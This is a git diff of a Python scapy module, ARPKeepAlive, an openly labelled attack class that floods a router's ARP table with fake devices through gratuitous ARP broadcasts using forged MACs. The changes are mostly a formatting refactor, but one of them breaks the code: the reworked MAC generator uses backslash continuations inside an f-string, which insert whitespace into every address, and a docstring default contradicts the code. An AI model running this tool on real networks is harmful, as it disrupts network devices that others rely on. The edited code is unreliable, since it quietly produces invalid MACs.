@@ -1,19 +1,26 @@
 import random
 import re
-import time
 import threading
-from scapy.all import Ether, ARP, sendp
+import time
+
+from scapy.all import ARP, Ether, sendp
+from scapy.packet import Packet
+
 from .base_attack import BaseAttack
+
 
 class ARPKeepAlive(BaseAttack):
     """Maintain fake devices in router's ARP table"""
-    
-    def __init__(self, interface: str, 
-                 base_ip: str, 
-                 num_devices: int = 50, 
-                 mac_prefix: str = "de:ad:00", 
-                 interval: float = 5.0, 
-                 cycles: int = 1):
+
+    def __init__(
+        self,
+        interface: str,
+        base_ip: str,
+        num_devices: int = 50,
+        mac_prefix: str = "de:ad:00",
+        interval: float = 5.0,
+        cycles: int = 1,
+    ):
         """
         Enhanced ARP keep-alive with new parameters:
         :param mac_prefix: First 3 bytes of MAC addresses (default: 02:00:00)
@@ -29,29 +36,33 @@ class ARPKeepAlive(BaseAttack):
         self._validate_ip()
         self._validate_mac_prefix()
 
-    def _validate_ip(self):
+    def _validate_ip(self) -> None:
         """Validate base IP format"""
-        parts = self.base_ip.split('.')
-        if len(parts) != 4 or not self.base_ip.endswith('.'):
+        parts = self.base_ip.split(".")
+        if len(parts) != 4 or not self.base_ip.endswith("."):
             raise ValueError("Invalid base IP format. Use format like '192.168.1.'")
 
-    def _validate_mac_prefix(self):
+    def _validate_mac_prefix(self) -> None:
         """Validate first 3 bytes of MAC address"""
         if not re.match(r"^([0-9A-Fa-f]{2}:){2}[0-9A-Fa-f]{2}$", self.mac_prefix):
             raise ValueError("Invalid MAC prefix. Use format like '02:00:00'")
 
     def _generate_mac(self, ip_suffix: int) -> str:
         """Generate deterministic MAC based on IP suffix"""
-        return f"{self.mac_prefix}:{ip_suffix:02x}:{random.randint(0, 0xff):02x}:{random.randint(0, 0xff):02x}"
+        return f"{self.mac_prefix}:\
+                {ip_suffix:02x}:\
+                {random.randint(0, 0xff):02x}:\
+                {random.randint(0, 0xff):02x}"
 
-    def _generate_arp_packet(self, ip_suffix: int):
+    def _generate_arp_packet(self, ip_suffix: int) -> Packet:
         """Create ARP announcement packet"""
         ip = f"{self.base_ip}{ip_suffix}"
         mac = self._generate_mac(ip_suffix)
-        return Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
-               ARP(op=1, hwsrc=mac, psrc=ip, pdst=ip)
+        return Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
+            op=1, hwsrc=mac, psrc=ip, pdst=ip
+        )
 
-    def _send_arp_announcements(self):
+    def _send_arp_announcements(self) -> None:
         """
         Send exactly `self.cycles` bursts of gratuitous ARP replies,
         waiting `self.interval` seconds between bursts.
@@ -77,10 +88,15 @@ class ARPKeepAlive(BaseAttack):
                     self.logger.info(f"Sent gratuitous ARP for {pkt.psrc}")
                 time.sleep(delay)
 
+            sleep_status = (
+                "no more cycles"
+                if cycle == self.cycles
+                else f"sleeping {self.interval}s"
+            )
             self.logger.info(
                 f"--- Completed ARP cycle {cycle}/{self.cycles}: "
                 f"{self.num_devices} packets sent; "
-                f"{'no more cycles' if cycle == self.cycles else f'sleeping {self.interval}s'} ---"
+                f"{sleep_status} ---"
             )
 
             if cycle < self.cycles and self.running:
@@ -91,7 +107,7 @@ class ARPKeepAlive(BaseAttack):
         self.logger.info("All ARP cycles complete; exiting.")
         self.stop()
 
-    def start(self):
+    def start(self) -> None:
         """Start ARP maintenance"""
         if not self.running:
             self.running = True
@@ -99,7 +115,7 @@ class ARPKeepAlive(BaseAttack):
             self.thread.start()
             self.logger.info(f"Started ARP keep-alive for {self.num_devices} devices")
 
-    def stop(self):
+    def stop(self) -> None:
         """Stop ARP maintenance safely (no self-join)."""
         self.running = False
         if (
